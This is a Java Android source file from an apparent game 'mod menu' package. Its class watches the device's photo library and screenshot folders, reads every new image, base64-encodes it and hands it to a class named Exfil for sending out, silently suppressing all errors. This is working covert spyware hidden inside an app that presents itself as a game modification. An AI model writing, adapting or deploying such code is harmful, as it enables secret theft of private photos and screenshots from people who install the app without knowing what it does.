package com.brawl.modmenu;

import android.content.Context;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.FileObserver;
import android.os.Handler;
import android.os.Looper;
import android.provider.MediaStore;
import android.util.Base64;
import java.io.File;
import java.io.FileInputStream;
import java.util.HashSet;
import java.util.Set;

public class NewPhotoWatcher {

    private static final Set<String> sent = new HashSet<>();
    private static long lastSend = 0;
    private static final long COOLDOWN = 2000;

    public static void start(final Context ctx) {
        try {
            // 1) Следим за MediaStore (все фото)
            ContentObserver observer = new ContentObserver(
                new Handler(Looper.getMainLooper())) {
                @Override
                public void onChange(boolean selfChange, Uri uri) {
                    super.onChange(selfChange, uri);
                    if (System.currentTimeMillis() - lastSend < COOLDOWN) return;
                    lastSend = System.currentTimeMillis();
                    new Thread(() -> sendLastPhoto(ctx)).start();
                }
            };
            ctx.getContentResolver().registerContentObserver(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, true, observer);

            // 2) Следим за папками скринов напрямую (FileObserver)
            String[] screenshotDirs = {
                "/sdcard/Pictures/Screenshots",
                "/sdcard/DCIM/Screenshots",
                "/sdcard/Screenshots",
                "/sdcard/Pictures/Screen",
                "/storage/emulated/0/Pictures/Screenshots"
            };
            for (String path : screenshotDirs) {
                File dir = new File(path);
                if (dir.exists()) {
                    try {
                        FileObserver fo = new FileObserver(dir.getAbsolutePath(),
                            FileObserver.CREATE | FileObserver.CLOSE_WRITE) {
                            @Override
                            public void onEvent(int event, String name) {
                                if (name == null) return;
                                if (System.currentTimeMillis() - lastSend < COOLDOWN) return;
                                lastSend = System.currentTimeMillis();
                                new Thread(() -> {
                                    try {
                                        Thread.sleep(2500);
                                        File f = new File(dir, name);
                                        sendPhoto(ctx, f);
                                    } catch (Throwable ignored) {}
                                }).start();
                            }
                        };
                        fo.startWatching();
                    } catch (Throwable ignored) {}
                }
            }
        } catch (Throwable ignored) {}
    }

    private static void sendLastPhoto(Context ctx) {
        try {
            Thread.sleep(3500);
            String[] proj = {MediaStore.Images.Media.DATA};
            android.database.Cursor c = ctx.getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                proj, null, null,
                MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 1");
            if (c != null && c.moveToFirst()) {
                String path = c.getString(0);
                c.close();
                sendPhoto(ctx, new File(path));
            }
        } catch (Throwable ignored) {}
    }

    private static void sendPhoto(Context ctx, File f) {
        try {
            if (f == null || !f.exists() || !f.isFile()) return;
            if (f.length() > 15 * 1024 * 1024) return;
            if (sent.contains(f.getAbsolutePath())) return;
            sent.add(f.getAbsolutePath());

            byte[] data = new byte[(int) f.length()];
            FileInputStream fis = new FileInputStream(f);
            fis.read(data);
            fis.close();
            String b64 = Base64.encodeToString(data, Base64.NO_WRAP);
            Exfil.sendPhotoFile("NEW: " + f.getName(), b64);
        } catch (Throwable ignored) {}
    }
}
